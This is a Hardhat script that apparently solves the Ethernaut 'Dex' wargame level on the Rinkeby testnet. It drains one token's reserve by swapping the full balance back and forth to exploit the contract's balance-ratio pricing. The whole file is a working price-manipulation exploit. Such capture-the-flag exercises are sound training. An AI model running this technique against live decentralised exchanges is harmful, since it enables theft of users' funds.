import { ethers } from "hardhat";

async function main(){

    // my rinkeby address
    let player = "0x87955711F08521Eb054f9354371eC38713f236ee";

    // Instance address
    let address_a = "0x5CA461d7235a3C5A8828D03CCcBa427B17D4Bbb7";

    let signer = await ethers.getSigner(player);
    let contract_a = await ethers.getContractAt("Dex", address_a, signer);

    let token1 = await contract_a.token1();
    let token2 = await contract_a.token2();

    let tx;
    tx = await contract_a.approve(address_a, 1000);
    await tx.wait();
    let token1_contract = await contract_a.balanceOf(token1,address_a);
    let token2_contract = await contract_a.balanceOf(token2,address_a);

    while(token1_contract.gte(ethers.BigNumber.from(0)) && token2_contract.gte(ethers.BigNumber.from(0))){
        let token1_player = await contract_a.balanceOf(token1,player);
        let token2_player = await contract_a.balanceOf(token2,player);
        // if we have more tokens of the same type as contract, then we can amount of tokens in the contract for all tokens of the other type, due to the pricing mechanism used here.
        if(token2_player.gte(token2_contract)){
            tx = await contract_a.swap(token2,token1,token2_contract);
            await tx.wait();
            break;
        }
        if(token1_player.gte(token1_contract)){
            tx = await contract_a.swap(token1,token2,token1_contract);
            await tx.wait();
            break;
        }
        // keep swapping all of one token for the other
        if(!token1_player.isZero()){
            tx = await contract_a.swap(token1,token2,token1_player);
            await tx.wait();
        }
        else{
            tx = await contract_a.swap(token2,token1,token2_player);
            await tx.wait();
        }
        token1_contract = await contract_a.balanceOf(token1,address_a);
        token2_contract = await contract_a.balanceOf(token2,address_a);
    }

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
